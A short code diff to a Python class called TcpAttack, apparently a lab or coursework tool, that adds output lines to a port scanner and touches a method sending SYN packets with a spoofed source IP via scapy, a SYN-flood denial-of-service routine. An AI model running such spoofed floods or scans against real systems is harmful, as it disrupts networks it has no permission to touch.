@@ -24,11 +24,14 @@ class TcpAttack:
                 open_ports.append(testport)
                 if verbosity: 
                     print("Port opened: ", testport)
+                sys.stdout.write("%s\n" % testport)                                    
+                sys.stdout.flush() 
 
             except:
                 if verbosity: 
                     print("Port closed: ", testport)
-
+                sys.stdout.write("")                                                
+                sys.stdout.flush()  
         for port in open_ports:
             OUTPUT_FILE.write(str(port) + "\n")
         
@@ -38,7 +41,7 @@ class TcpAttack:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(0.1)
         try:
-            for i in range(numSyn):
+            for _ in range(numSyn):
                 IP_header = scapy.all.IP(src=self.spoofIP, dst=self.targetIP)
                 TCP_header = scapy.all.TCP(flags='S', sport=RandShort(), dport=int(port))
                 packet = IP_header / TCP_header
